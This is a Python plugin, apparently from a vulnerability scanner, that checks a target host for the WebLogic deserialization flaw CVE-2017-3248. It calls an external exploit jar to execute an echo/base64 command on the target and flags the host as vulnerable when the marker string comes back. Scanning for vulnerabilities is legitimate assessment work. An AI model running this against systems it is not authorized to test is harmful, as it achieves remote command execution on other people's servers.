#!/usr/bin/python3.8
# -*- coding: utf-8 -*-
# @Time    : 2020/10/11 12:39 下午
# @Author  : rocky
# @Email   : 939555035@qq.com
# @File    : CVE_2017_3248_weblogic.py
# @Software: PyCharm

import requests
import time
import re
from subprocess import *
import os

from urllib.parse import urlparse


class run(object):
    def __init__(self):
        self.name = "CVE_2017_3248_weblogic"

    def runCheck(self, targetAddr, payload):
        """
        检测weblogic反序列化漏洞cve_2017_3248
        :param targetAddr:
        :param payload:
        :return:
        """
        currentTime = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())

        if 'https://' in targetAddr or 'http://' in targetAddr:
            pass
        else:
            targetAddr = 'http://' + targetAddr

        url = targetAddr

        _url = urlparse(url)
        hostname = _url.hostname
        port = _url.port
        current_file_path = __file__
        # 借助dirname()从绝对路径中提取目录
        current_file_dir = os.path.dirname(current_file_path)
        new_current_file_dir = os.path.dirname(current_file_dir)
        new_currnet_file_path = new_current_file_dir + '/jarpackage/weblogic_cmd.jar'

        try:
            p = Popen(
                ['java', '-jar', '{}'.format(new_currnet_file_path), '-H', '{}'.format(hostname), '-P',
                 '{}'.format(port), '-C', 'echo UjFhbmRyMG9wCg== | base64'], stdin=PIPE, stdout=PIPE, )
            p.wait()
            res = p.stdout.read()

            if 'VWpGaGJtUnlNRzl3Q2c9PQo=' in str(res):
                status_data = '[+]{} is vulnerable! {}'.format(targetAddr, currentTime)
                return {'status': 20003, 'data': status_data, 'type': 'status'}
            else:
                status_data = '[-]{} is unvulnerable! {}'.format(targetAddr, currentTime)
                return {'status': 20004, 'data': status_data, 'type': 'status'}

        except requests.exceptions.RequestException as e:
            status_data = '[!]{} 请求超时! {}'.format(targetAddr, currentTime)
            return {'status': 20002, 'data': status_data, 'type': 'status'}
